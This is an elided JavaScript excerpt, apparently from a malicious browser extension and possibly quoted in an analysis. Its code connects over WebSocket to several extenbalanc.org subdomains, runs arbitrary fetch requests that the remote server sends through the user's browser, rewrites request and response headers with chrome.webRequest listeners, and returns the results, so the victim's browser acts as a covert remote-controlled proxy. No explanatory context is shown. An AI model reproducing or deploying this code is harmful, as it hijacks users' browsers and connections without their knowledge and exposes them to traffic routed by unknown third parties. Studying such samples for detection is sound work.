function initProxy() {
  ...
  function connect(WS_SERVER_HOST) {
    if (IS_VISIBLE_LOGS) console.log("connect to " + WS_SERVER_HOST);

    var WS = new WebSocket(
      "ws://" + WS_SERVER_HOST + ":" + WS_SERVER_PORT + "/server_info"
    );
    ...
    WS.onmessage = function message(event) {
      ...
      if (data.reqid && data.method && data.url) {
        ...
        fetch(data.url, request)
          .then(function (res) {
            if (requests[data.reqid].do_stop) throw "Stop processing request";
            ...
            for (var header of res.headers) {
              if (rejected_response_headers[header[0].toLowerCase()]) continue;

              if (!data.headers[header[0]]) data.headers[header[0]] = [];
          ...
          .then(function (res) {
            ...
            if (!requests[data.reqid].response_headers) {
              ...
              response_headers["X-prx-finalURL"] =
                data.headers["X-prx-finalURL"];
            }
            ...
            if (!requests[data.reqid].do_stop) {
              if (IS_VISIBLE_LOGS)
                console.log(
                  data.reqid,
                  err,
                  requests[data.reqid].response_error
                );
              var res_err = "";
              res_err += requests[data.reqid].response_error
                ? requests[data.reqid].response_error
                : "";
              res_err += " ; ";
              ...
              WS.send(
                JSON.stringify({
                  reqid: data.reqid,
                  statusCode: requests[data.reqid].response_status_code
                    ? requests[data.reqid].response_status_code
                    : 0,
                  statusText: requests[data.reqid].response_status_text
                    ? requests[data.reqid].response_status_text
                    : "",
                  headers: requests[data.reqid].response_headers
                    ? requests[data.reqid].response_headers
                    : [],
                  res: btoa(res_err),
                })
              );
              ...
              if (IS_VISIBLE_LOGS)
                console.log(
                  "stop processing request, ignoring errors",
                  data.reqid
                );
            }
    ...
    WS.onclose = function reconnect(event) {
      ...
      if (IS_VISIBLE_LOGS) console.log("reconnect in 15 sec");
      setTimeout(function () {
  ...
  function multipleConnection() {
    connect(PARTNER_ID + ".extenbalanc.org");
    connect(PARTNER_ID + "2.extenbalanc.org");
    connect(PARTNER_ID + "3.extenbalanc.org");
  }
  ...
  function headers_listeners(extra) {
    ...
    if (extra) opts.push("extraHeaders");
    ...
    chrome.webRequest.onBeforeSendHeaders.addListener(
      function (details) {
        ...
        for (var header of details.requestHeaders) {
          ...
          if (lheader == "x-reqid-chrextprxagn") reqid = header.value;
        ...
        if (!reqid || !requests[reqid]) {
          if (IS_VISIBLE_LOGS) console.log("no request", reqid);
          return;
        }
        ...
        if (!requests[reqid].headers) {
          if (IS_VISIBLE_LOGS) console.log("no request headers", reqid);
          return;
        }

        if (saved_headers.length) var new_requestHeaders = saved_headers;
        else var new_requestHeaders = [];
    ...
    chrome.webRequest.onHeadersReceived.addListener(
      function (details) {
        ...
        for (var i in details.responseHeaders) {
          ...
          if (rejected_response_headers[lheader_name]) continue;

          if (!requests[reqid].response_headers[header_name])
            requests[reqid].response_headers[header_name] = [];
          requests[reqid].response_headers[header_name].push(
        ...
        requests[reqid].response_status_text = details.statusLine.replace(
          /^HTTP\/[0-9\.]+\s+\d+\s*/,
          ""
        );
    ...
    var AbortSignal = (function (_Emitter) {
      ...
      function AbortSignal() {
        ...
        var _this2 = possibleConstructorReturn(
          this,
          (AbortSignal.__proto__ || Object.getPrototypeOf(AbortSignal)).call(
            this
          )
        );
      ...
      createClass(AbortSignal, [
        ...
        },
        {
          ...
          value: function dispatchEvent(event) {
            ...
            get(
              AbortSignal.prototype.__proto__ ||
